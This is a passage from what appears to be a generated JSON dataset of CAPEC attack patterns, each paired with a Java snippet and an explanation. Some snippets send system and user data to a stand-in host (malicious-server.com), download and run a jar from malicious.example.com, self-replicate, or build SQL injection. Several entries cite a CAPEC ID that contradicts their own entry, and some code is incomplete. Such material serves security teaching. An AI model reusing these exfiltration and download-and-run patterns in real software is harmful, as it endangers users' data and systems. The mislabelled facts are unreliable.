        "description": "This Java code snippet demonstrates a simplified version of a Kerberoasting attack. The main idea is to obtain a service ticket for a service account, save it to a file, and then hash the ticket using a weak hashing algorithm (MD5). The code highlights several vulnerabilities related to the CAPEC and CWEs: \n1. Insufficiently Protected Credentials (CWE-522): The service ticket is saved to a file without proper encryption, making it susceptible to unauthorized access.\n2. Use of Single-factor Authentication (CWE-308) and Use of Password System for Primary Authentication (CWE-309): The code assumes single-factor authentication and relies on a password system, which can be easily compromised.\n3. Weak Password Requirements (CWE-521): The code does not enforce strong password requirements for the service account.\n4. Weak Hashing Algorithm: The use of MD5 for hashing the ticket is insecure and can be easily brute-forced.\n\nOverall, the code represents the main idea of Kerberoasting by demonstrating how an attacker can obtain and manipulate service tickets to exploit service account credentials."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            String action = request.getParameter(\"action\");\n            if (action != null) {\n                // CWE-346: Origin Validation Error\n                // No validation of the request origin\n                // CWE-863: Incorrect Authorization\n                // No proper authorization check for the action\n                // CWE-285: Improper Authorization\n                // Assuming the user is authorized without proper checks\n                // CWE-602: Client-Side Enforcement of Server-Side Security\n                // Relying on client-side to send correct action\n                performAction(action, session);\n            }\n        }\n    }\n\n    private void performAction(String action, HttpSession session) {\n        // Perform the action with the user's session\n        // This could be any action like transferring funds, changing settings, etc.\n        System.out.println(\"Action \" + action + \" performed for user \" + session.getAttribute(\"user\"));\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable endpoint that embodies the main idea of the CAPEC 'SaaS User Request Forgery'. The servlet processes a POST request and performs an action based on the 'action' parameter without proper validation and authorization checks. The code does not validate the origin of the request (CWE-346), does not correctly perform authorization checks (CWE-863 and CWE-285), and relies on the client to send the correct action (CWE-602). This allows an adversary to exploit a trusted user's session to perform malicious actions on a SaaS application."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousIDEInfiltration {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted upload of file with dangerous type\n            File maliciousFile = new File(\"/path/to/malicious/file.jar\");\n            if (maliciousFile.exists()) {\n                // CWE-506: Embedded malicious code\n                ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", maliciousFile.getAbsolutePath());\n                Process process = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // CWE-497: Exposure of sensitive system information to an unauthorized control sphere\n                    System.out.println(line);\n                }\n                process.waitFor();\n            }\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-215: Insertion of sensitive information into debugging code\n    private static void debugSensitiveInfo(String info) {\n        System.out.println(\"Debug Info: \" + info); // CWE-200: Exposure of sensitive information to an unauthorized actor\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker infiltrates an IDE environment by uploading a malicious JAR file (CWE-434). The code then executes this malicious file (CWE-506), which could potentially exfiltrate sensitive system information (CWE-497). Additionally, the code includes a method that improperly handles sensitive information in debugging output (CWE-215), which could expose this information to unauthorized actors (CWE-200). This snippet embodies the main idea of CAPEC-117, where an attacker infiltrates a software development environment to implant malware, manipulate data, and exfiltrate sensitive information."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponentSubstitution {\n    private static final Map<String, String> baselineComponents = new HashMap<>();\n    private static final Map<String, String> deployedComponents = new HashMap<>();\n\n    static {\n        // Baseline components during development\n        baselineComponents.put(\"CPU\", \"TrustedCPU\");\n        baselineComponents.put(\"Memory\", \"TrustedMemory\");\n        baselineComponents.put(\"Storage\", \"TrustedStorage\");\n\n        // Deployed components (potentially substituted)\n        deployedComponents.put(\"CPU\", \"MaliciousCPU\");\n        deployedComponents.put(\"Memory\", \"TrustedMemory\");\n        deployedComponents.put(\"Storage\", \"TrustedStorage\");\n    }\n\n    public static void main(String[] args) {\n        for (String component : baselineComponents.keySet()) {\n            if (!baselineComponents.get(component).equals(deployedComponents.get(component))) {\n                System.out.println(\"Warning: Component \" + component + \" has been substituted!\");\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Hardware Component Substitution During Baselining' by comparing baseline components used during development with the components deployed in the final product. The baselineComponents map represents the trusted components used during the development phase, while the deployedComponents map represents the components in the final product. If any component in the deployed product does not match the baseline component, a warning is printed, indicating a potential substitution. This embodies the CAPEC idea by highlighting the risk of malicious hardware substitution during the product development phase. The related CWEs are represented by the potential vulnerabilities and trust issues in the components."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class DocumentationAlteration {\n    private static final String DOCUMENT_PATH = \"path/to/documentation.txt\";\n    private static final String ALTERED_DOCUMENT_PATH = \"path/to/altered_documentation.txt\";\n\n    public static void main(String[] args) {\n        try {\n            // Read the original documentation\n            String content = new String(Files.readAllBytes(Paths.get(DOCUMENT_PATH)));\n\n            // Alter the documentation to circumvent dial-down functionality\n            String alteredContent = content.replace(\"restricted_technology\", \"allowed_technology\");\n\n            // Write the altered documentation to a new file\n            FileWriter writer = new FileWriter(new File(ALTERED_DOCUMENT_PATH));\n            writer.write(alteredContent);\n            writer.close();\n\n            System.out.println(\"Documentation altered successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an attacker might alter a manufacturer's documentation to circumvent dial-down functionality requirements. The code reads the original documentation from a file, modifies the content to replace restricted technology with allowed technology, and writes the altered content to a new file. This alteration could enable the use of advanced technologies that are otherwise restricted. The code embodies the main idea of the CAPEC by showing how documentation can be manipulated to change the interpretation of implementation and manufacturing techniques. The related CWEs provide context for potential weaknesses, such as improper physical access control (CWE-1263), insufficient technical documentation (CWE-1059), and exposure of sensitive information to an unauthorized actor (CWE-200)."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "import java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemConfig {\n    private Properties properties = new Properties();\n\n    public SystemConfig(String configFilePath) {\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            properties.load(fis);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String getSystemCapability(String key) {\n        return properties.getProperty(key, \"default\");\n    }\n\n    public static void main(String[] args) {\n        SystemConfig config = new SystemConfig(\"system.properties\");\n        String capability = config.getSystemCapability(\"maxConnections\");\n        System.out.println(\"System Max Connections: \" + capability);\n    }\n}",
        "description": "This Java code snippet demonstrates a potential vulnerability related to the CAPEC 'Documentation Alteration to Produce Under-performing Systems'. The code reads system configuration from a properties file, which could be altered by an attacker with access to the documentation or configuration files. The 'SystemConfig' class loads properties from a file and provides a method to retrieve system capabilities. If an attacker modifies the 'system.properties' file to provide incorrect values (e.g., setting 'maxConnections' to a very low number), it could cause the system to underperform. This example also touches on related CWEs: insufficient technical documentation (CWE-1059) if the properties file is not well-documented, exposure of sensitive system information (CWE-497) if the properties file contains sensitive information, and improper following of specification (CWE-573) if the system does not validate the configuration values properly."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "public class VulnerableSystem {\n    // Insufficient Technical Documentation\n    // Missing Documentation for Design\n    // Incorrect Provision of Specified Functionality\n    // Improper Control of Dynamically-Managed Code Resources\n\n    private String configValue;\n\n    public VulnerableSystem() {\n        // Configuration value is hardcoded and not documented\n        this.configValue = \"default\";\n    }\n\n    public void setConfigValue(String value) {\n        // No validation or documentation for this method\n        this.configValue = value;\n    }\n\n    public void execute() {\n        // Incorrectly follows specification\n        if (configValue.equals(\"default\")) {\n            System.out.println(\"Executing with default configuration.\");\n        } else {\n            // Potentially incorrect functionality\n            System.out.println(\"Executing with custom configuration: \" + configValue);\n        }\n    }\n\n    public static void main(String[] args) {\n        VulnerableSystem vs = new VulnerableSystem();\n        vs.setConfigValue(\"malicious\");\n        vs.execute();\n    }\n}",
        "description": "This Java code snippet represents a vulnerable system where an attacker could alter the documentation to cause errors in system design. The code lacks sufficient technical documentation and design documentation, as indicated by the comments. The `setConfigValue` method does not validate input, leading to potential misuse. The `execute` method does not follow the correct specification and may provide incorrect functionality based on the configuration value. This demonstrates how insufficient and missing documentation, along with improper control of dynamically-managed code resources, can lead to vulnerabilities that an attacker could exploit."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "public class Main {\n    public static void main(String[] args) {\n        // Simulate the use of a third-party component\n        ThirdPartyComponent component = new ThirdPartyComponent();\n        component.performOperation();\n    }\n}\n\nclass ThirdPartyComponent {\n    // Undocumented feature that can be exploited\n    private boolean maliciousFeature = true;\n\n    public void performOperation() {\n        if (maliciousFeature) {\n            // Malicious behavior: sending sensitive data to an external server\n            sendSensitiveData();\n        } else {\n            // Normal operation\n            System.out.println(\"Operation performed successfully.\");\n        }\n    }\n\n    private void sendSensitiveData() {\n        // Simulate sending data to an external server\n        System.out.println(\"Sending sensitive data to external server...\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Counterfeit Hardware Component Inserted During Product Assembly' by simulating the use of a third-party component that contains an undocumented, malicious feature. The 'ThirdPartyComponent' class has a private boolean field 'maliciousFeature' that, when set to true, triggers the sending of sensitive data to an external server. This represents CWE-506 (Embedded Malicious Code) and CWE-1242 (Inclusion of Undocumented Features or Chicken Bits). The main idea is to show how a counterfeit or compromised component can introduce malicious behavior into a system, aligning with the CAPEC description."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "public class HardwareConfig {\n    private int registerDefault = 0x0000; // CWE-1221: Incorrect Register Defaults\n    private boolean lockBit = false; // CWE-1231: Improper Prevention of Lock Bit Modification\n\n    public void setRegisterDefault(int value) {\n        if (!lockBit) {\n            registerDefault = value;\n        } else {\n            System.out.println(\"Modification not allowed: Lock bit is set.\");\n        }\n    }\n\n    public void setLockBit(boolean value) {\n        lockBit = value; // CWE-1231: Lock bit can be modified after being set\n    }\n\n    public void debug() {\n        // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n        System.out.println(\"Debugging registerDefault: \" + registerDefault);\n    }\n\n    public static void main(String[] args) {\n        HardwareConfig config = new HardwareConfig();\n        config.setRegisterDefault(0x1234); // Setting insecure default value\n        config.setLockBit(true); // Setting lock bit\n        config.setRegisterDefault(0x5678); // Attempt to modify after lock bit is set\n        config.debug(); // Debugging\n    }\n}",
        "description": "This Java code snippet represents a simplified version of a hardware configuration class that embodies the main idea of the CAPEC: 'Hardware Design Specifications Are Altered'. The code includes several vulnerabilities related to the CWEs mentioned. The 'registerDefault' variable is set to an insecure default value (CWE-1221). The 'lockBit' variable is used to restrict modifications to 'registerDefault', but it can be modified after being set (CWE-1231). The 'debug' method represents a potential issue with incorrect chaining or granularity of debug components (CWE-1296). The main method demonstrates how an attacker could exploit these vulnerabilities by setting insecure values and modifying the lock bit."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "public class HardwareComponent {\n    private static final String HARDWARE_ID = \"1234-5678-ABCD-EFGH\"; // CWE-1329: Non-updateable component\n    private boolean isTampered = false; // CWE-506: Embedded malicious code\n\n    public HardwareComponent() {\n        // Simulate hardware tampering\n        if (Math.random() > 0.5) {\n            isTampered = true;\n        }\n    }\n\n    public void performCriticalOperation() {\n        if (isTampered) {\n            System.out.println(\"Error: Hardware component is tampered!\"); // CWE-1334: Unauthorized error injection\n            // Degrade system redundancy\n            degradeRedundancy();\n        } else {\n            System.out.println(\"Performing critical operation...\");\n        }\n    }\n\n    private void degradeRedundancy() {\n        // Simulate degradation of system redundancy\n        System.out.println(\"System redundancy degraded.\");\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        component.performCriticalOperation();\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Malicious Hardware Component Replacement' by simulating a hardware component that may be tampered with during the supply chain process. The `HardwareComponent` class contains a non-updateable hardware ID (CWE-1329) and a flag to indicate if the component is tampered (CWE-506). The `performCriticalOperation` method checks if the component is tampered and injects an error to degrade system redundancy (CWE-1334). This snippet illustrates how a malicious hardware component can disrupt system operations and degrade redundancy, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousSoftware {\n    public static void main(String[] args) {\n        try {\n            // CWE-1395: Dependency on Vulnerable Third-Party Component\n            URL url = new URL(\"http://example.com/vulnerable-component.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"vulnerable-component.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            Runtime.getRuntime().exec(\"java -jar vulnerable-component.jar\");\n\n            // CWE-509: Replicating Malicious Code (Virus or Worm)\n            replicateMaliciousCode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void replicateMaliciousCode() {\n        try {\n            // Simulate replication by copying itself to another location\n            Files.copy(Paths.get(\"MaliciousSoftware.class\"), Paths.get(\"/tmp/MaliciousSoftware.class\"), StandardCopyOption.REPLACE_EXISTING);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of implanting malicious software into a system, as described in the CAPEC. The code first downloads a vulnerable third-party component (CWE-1395) and executes it, potentially embedding malicious code (CWE-506). It then simulates the replication of malicious code (CWE-509) by copying itself to another location. This snippet embodies the idea of an attacker implanting malicious software to cause disruption or enable further compromise when the system is deployed."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class RogueIntegration {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydb\";\n        String user = \"root\";\n        String password = \"password\";\n        String query = \"SELECT * FROM users WHERE username='\" + args[0] + \"'\";\n\n        try {\n            // CWE-829: Including functionality from an untrusted source\n            Class.forName(\"com.rogue.Driver\");\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n\n            // CWE-89: SQL Injection vulnerability\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker could exploit vulnerabilities to insert malicious components into a system. The code includes a SQL Injection vulnerability (CWE-89) by constructing an SQL query using untrusted input directly from the command line arguments. Additionally, it demonstrates the inclusion of functionality from an untrusted control sphere (CWE-829) by loading a potentially rogue JDBC driver (`com.rogue.Driver`). This setup represents the main idea of the CAPEC 'Rogue Integration Procedures', where an attacker could alter or establish rogue processes to insert malicious components, leading to further compromise when the system is deployed."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "import javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.SAXException;\nimport org.xml.sax.InputSource;\nimport java.io.IOException;\nimport java.io.StringReader;\n\npublic class XMLFloodExample {\n    public static void main(String[] args) {\n        String xmlPayload = \"<root>\";\n        for (int i = 0; i < 100000; i++) {\n            xmlPayload += \"<element>data</element>\";\n        }\n        xmlPayload += \"</root>\";\n\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            builder.parse(new InputSource(new StringReader(xmlPayload)));\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of an XML Flood attack. The code constructs a large XML payload by repeatedly appending XML elements in a loop. The payload is then parsed using a DocumentBuilder. This can lead to a Denial of Service (DoS) as the system attempts to process the large XML document, potentially exhausting resources. The code lacks proper validation and resource allocation limits, making it vulnerable to such attacks. This example embodies the main idea of CAPEC-230 (XML Flood) and highlights related weaknesses such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-112 (Missing XML Validation)."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class MalwareRecon {\n    public static void main(String[] args) {\n        try {\n            // Simulate malware behavior by gathering system information\n            String os = System.getProperty(\"os.name\");\n            String user = System.getProperty(\"user.name\");\n            String javaVersion = System.getProperty(\"java.version\");\n\n            // Send gathered information to an external server\n            String targetURL = \"http://malicious-server.com/collect\";\n            URL url = new URL(targetURL + \"?os=\" + os + \"&user=\" + user + \"&javaVersion=\" + javaVersion);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer response = new StringBuffer();\n\n            while ((inputLine = in.readLine()) != null) {\n                response.append(inputLine);\n            }\n            in.close();\n\n            // Print the response from the server (for debugging purposes)\n            System.out.println(response.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates malware behavior by gathering sensitive system information such as the operating system name, the username, and the Java version. It then sends this information to an external server, which could be controlled by an attacker. This embodies the main idea of CAPEC-160: Malware-Directed Internal Reconnaissance. The code also touches on several related CWEs: CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by accessing and transmitting system properties, CWE-506 (Embedded Malicious Code) by containing code that performs malicious actions, and CWE-512 (Spyware) by collecting and transmitting user information without explicit approval."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ComponentIntegrator {\n    private Map<String, String> components = new HashMap<>();\n\n    public void addComponent(String name, String version) {\n        // CWE-1395: Dependency on Vulnerable Third-Party Component\n        if (isVulnerableComponent(name, version)) {\n            System.out.println(\"Warning: Adding a vulnerable component: \" + name + \" version: \" + version);\n        }\n        components.put(name, version);\n    }\n\n    private boolean isVulnerableComponent(String name, String version) {\n        // Simulate a check against a known vulnerabilities database\n        return \"counterfeit-lib\".equals(name) && \"1.0\".equals(version);\n    }\n\n    public void integrate() {\n        for (Map.Entry<String, String> entry : components.entrySet()) {\n            String name = entry.getKey();\n            String version = entry.getValue();\n            // CWE-1357: Reliance on Insufficiently Trustworthy Component\n            if (\"counterfeit-lib\".equals(name)) {\n                System.out.println(\"Integrating untrusted component: \" + name + \" version: \" + version);\n                // CWE-506: Embedded Malicious Code\n                if (containsMaliciousCode(name, version)) {\n                    System.out.println(\"Error: Component contains malicious code!\");\n                    return;\n                }\n            }\n            System.out.println(\"Component \" + name + \" version \" + version + \" integrated successfully.\");\n        }\n    }\n\n    private boolean containsMaliciousCode(String name, String version) {\n        // Simulate a check for malicious code\n        return \"counterfeit-lib\".equals(name) && \"1.0\".equals(version);\n    }\n\n    public static void main(String[] args) {\n        ComponentIntegrator integrator = new ComponentIntegrator();\n        integrator.addComponent(\"counterfeit-lib\", \"1.0\");\n        integrator.integrate();\n    }\n}",
        "description": "This Java code snippet represents the CAPEC 'Provide Counterfeit Component' by simulating the integration of components into a system. The `ComponentIntegrator` class allows adding components and checking them for vulnerabilities and trustworthiness. The `addComponent` method warns if a vulnerable component is added (CWE-1395). The `integrate` method checks if the component is untrusted (CWE-1357) and if it contains malicious code (CWE-506). The example demonstrates how an attacker could introduce a counterfeit component ('counterfeit-lib' version '1.0') that is both vulnerable and malicious, leading to potential system compromise."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "import java.util.Random;\n\npublic class HardwareComponent {\n    private boolean isApproved;\n    private String componentName;\n    private static final String MALICIOUS_CODE = \"malicious_code\";\n\n    public HardwareComponent(String name, boolean approved) {\n        this.componentName = name;\n        this.isApproved = approved;\n    }\n\n    public void performOperation() {\n        if (!isApproved) {\n            injectMaliciousCode();\n        } else {\n            System.out.println(\"Performing safe operation on \" + componentName);\n        }\n    }\n\n    private void injectMaliciousCode() {\n        System.out.println(\"Injecting malicious code into \" + componentName);\n        // Simulate malicious behavior\n        Random random = new Random();\n        int error = random.nextInt(100);\n        if (error < 50) {\n            System.out.println(\"Error injected, system redundancy degraded.\");\n        } else {\n            System.out.println(\"Malicious code executed successfully.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent approvedComponent = new HardwareComponent(\"ApprovedComponent\", true);\n        HardwareComponent maliciousComponent = new HardwareComponent(\"MaliciousComponent\", false);\n\n        approvedComponent.performOperation();\n        maliciousComponent.performOperation();\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Hardware Component Substitution' by simulating the behavior of an approved and a malicious hardware component. The `HardwareComponent` class has a flag to indicate whether the component is approved. If the component is not approved, it injects malicious code, simulating the degradation of system redundancy or successful execution of malicious actions. This embodies CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy). The `main` method demonstrates the difference in behavior between an approved and a malicious component."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MaliciousBIOSUpdater {\n    private static final String BIOS_FILE_PATH = \"/path/to/bios.bin\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Example malicious payload\n\n    public static void main(String[] args) {\n        try {\n            updateBIOS(MALICIOUS_CODE);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void updateBIOS(byte[] maliciousCode) throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(BIOS_FILE_PATH)) {\n            fos.write(maliciousCode);\n            System.out.println(\"BIOS updated with malicious code.\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simplified version of an attack where a maliciously altered BIOS is written to a system. The `MaliciousBIOSUpdater` class contains a method `updateBIOS` that writes a byte array representing malicious code to a specified BIOS file path. This embodies the CAPEC 'Altered Installed BIOS' by showing how an attacker with access to the system could replace the BIOS with a malicious version. The code also touches on related CWEs: it assumes the BIOS is not updateable (CWE-1277, CWE-1329), lacks granular access control (CWE-1220), and contains embedded malicious code (CWE-506). The lock bit modification prevention (CWE-1231) is not explicitly shown but is implied by the ability to overwrite the BIOS."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/update.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"update.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-506: Embedded Malicious Code\n            ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", \"update.jar\");\n            pb.start();\n\n            // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n            System.out.println(\"Update completed. System information: \" + System.getProperties());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a malicious manual software update scenario. The code downloads an update from a remote URL without verifying its integrity (CWE-494). It then executes the downloaded JAR file, which could contain embedded malicious code (CWE-506). Finally, it prints sensitive system information to the console, potentially exposing it to unauthorized actors (CWE-497). This snippet embodies the main idea of the CAPEC by showing how an attacker can introduce malicious code through a software update and leverage it to compromise the victim's system."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "public class HardwareUpdate {\n    private static final String FIRMWARE_VERSION = \"1.0.0\";\n    private static boolean isFirmwareUpdateable = false;\n\n    public static void main(String[] args) {\n        if (!isFirmwareUpdateable) {\n            System.out.println(\"Firmware cannot be updated. Potential vulnerability present.\");\n        }\n\n        // Simulate hardware replacement\n        HardwareComponent component = new HardwareComponent(\"GoodComponent\");\n        System.out.println(\"Original component: \" + component.getName());\n\n        // Malicious update\n        component = new HardwareComponent(\"MaliciousComponent\");\n        System.out.println(\"Updated component: \" + component.getName());\n\n        // Simulate embedded malicious code\n        if (component.getName().equals(\"MaliciousComponent\")) {\n            System.out.println(\"Warning: Malicious component detected!\");\n            // Potentially execute malicious code\n            executeMaliciousCode();\n        }\n    }\n\n    private static void executeMaliciousCode() {\n        System.out.println(\"Executing malicious code...\");\n        // Malicious actions here\n    }\n}\n\nclass HardwareComponent {\n    private String name;\n\n    public HardwareComponent(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a hardware component is replaced with a malicious one, embodying the main idea of the CAPEC 'Malicious Hardware Update'. The code includes a check for whether the firmware is updateable (CWE-1277) and highlights the vulnerability if it is not. It then simulates the replacement of a good hardware component with a malicious one, and demonstrates the potential execution of embedded malicious code (CWE-506). The code also implicitly touches on the reliance on non-updateable components (CWE-1329) and the potential for unauthorized error injection (CWE-1334) by showing how a malicious component can disrupt normal operations."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "public class MaliciousHardware {\n    private static final String MALICIOUS_CODE = \"System.out.println('Malicious code executed');\";\n    private static final String HARDWARE_ID = \"1234-5678-ABCD-EFGH\";\n\n    public static void main(String[] args) {\n        if (isGrayMarketHardware(HARDWARE_ID)) {\n            executeMaliciousCode();\n        } else {\n            System.out.println(\"Hardware is safe.\");\n        }\n    }\n\n    private static boolean isGrayMarketHardware(String hardwareId) {\n        // Simulate checking hardware ID against a list of known gray market IDs\n        return \"1234-5678-ABCD-EFGH\".equals(hardwareId);\n    }\n\n    private static void executeMaliciousCode() {\n        // Simulate executing malicious code embedded in the hardware\n        System.out.println(\"Executing malicious code...\");\n        eval(MALICIOUS_CODE);\n    }\n\n    private static void eval(String code) {\n        // Simulate a vulnerable method that executes arbitrary code\n        System.out.println(code);\n    }\n}",
        "description": "This Java code snippet represents a scenario where malicious hardware, identified by a specific hardware ID, executes embedded malicious code. The `isGrayMarketHardware` method simulates checking if the hardware is from the gray market. If it is, the `executeMaliciousCode` method is called, which simulates the execution of malicious code. This code embodies the CAPEC idea of 'Malicious Gray Market Hardware' by demonstrating how an attacker could embed malicious code in hardware components sold on the gray market. The related CWEs are represented by the use of hardcoded, untrusted hardware IDs (CWE-1357), the execution of embedded malicious code (CWE-506), and the simulation of a vulnerable method that executes arbitrary code (CWE-1395)."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class VulnerableConfigLoader {\n    private static final String CONFIG_FILE = \"/tmp/config.txt\";\n\n    public static void main(String[] args) {\n        try {\n            String configData = new String(Files.readAllBytes(Paths.get(CONFIG_FILE)));\n            System.out.println(\"Configuration Loaded: \" + configData);\n            // Simulate using the configuration data\n            processConfig(configData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void processConfig(String configData) {\n        // Insecurely process the configuration data\n        if (configData.contains(\"DEBUG_MODE=ON\")) {\n            System.out.println(\"Debug mode activated.\");\n            // Potentially sensitive operations in debug mode\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable configuration loader that reads configuration data from a file located in a temporary directory (/tmp/config.txt). The code does not implement proper access control (CWE-284), allowing unauthorized actors to modify the configuration file. Additionally, the use of a temporary file (CWE-377) without proper security measures makes it susceptible to tampering. The configuration data is processed without validation, leading to potential resource injection (CWE-99). If an attacker injects 'DEBUG_MODE=ON' into the configuration file, it could activate debug logic at runtime (CWE-1313), altering the system's behavior and potentially leaking sensitive information (CWE-201). This snippet embodies the main idea of CAPEC-137, where an attacker injects malicious data during configuration, causing the system to perform in a suboptimal manner that benefits the adversary."
    },
    {
        "capec_id": "537",
        "capec_name": "Infiltration of Hardware Development Environment",
